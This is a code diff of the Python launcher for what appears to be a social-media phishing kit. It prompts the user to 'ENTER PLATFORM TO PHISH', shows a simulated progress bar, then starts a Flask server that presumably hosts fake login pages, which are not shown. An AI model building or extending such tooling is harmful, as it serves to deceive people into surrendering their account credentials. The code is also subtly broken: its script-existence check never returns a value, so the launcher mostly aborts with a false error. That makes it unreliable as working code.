@@ -1,15 +1,57 @@
 import os
-from Asessts.assets import banner,SocialMediaMenu,colors
+import sys
+from Asessts.assets import banner, SocialMediaMenu, colors, io
+import time
+from app import app
+import random
+
 print(banner.banner)
 
-socialmedia=SocialMediaMenu()
+socialmedia = SocialMediaMenu()
 socialmedia.display_menu()
+isAvailable = [1]
 
-userChoice=input(f"{colors.blue}\nENTER PLATFORM TO PHISH:{colors.green} ")
-try:
-    int(userChoice)
-except Exception as e:
-    print(e)
-    
-print(socialmedia.platforms.get(int(userChoice)))
 
+def userChoice_funct():
+    userChoice = input(f"{colors.blue}\nENTER PLATFORM TO PHISH:{colors.green} ")
+    try:
+        newuserChoice = int(userChoice)
+        if newuserChoice not in isAvailable:
+            io.output(info="The Service is not available Yet.", color=colors.red)
+            io.output(info="Available Services "+str(isAvailable), color=colors.blue)
+            userChoice_funct()
+        else:
+            platform = socialmedia.platforms.get(newuserChoice)
+            io.output(info=f"preparing {platform} scripts........", color=colors.green)
+            progress = ""
+            isExists=checkScripts(platform=platform.lower())
+            randPercentage = random.randint(1, 100)
+            for i in range(100):
+                
+                time.sleep(0.2)
+                progress += "="
+                print(f"{progress} {i}% \r", end=' ', flush=True)
+                if i==randPercentage:
+                    if isExists:
+                        pass
+                    else:
+                        io.output(info=f"[!] Error finding {platform} script",color=colors.red)
+                        sys.exit(0)
+                if i == 99:
+                    print(f"{progress} {i}% done!!")
+                    # starting flask program
+                    if __name__ == "__main__":
+                        app.run(debug=True)
+
+    except Exception as e:
+        print(e)
+        sys.exit(0)
+
+def checkScripts(platform):
+    path=f"./templates/{platform}"
+    if os.path.isdir(path):
+        print("exist")
+    else:
+        print("does not exist")
+
+userChoice_funct()
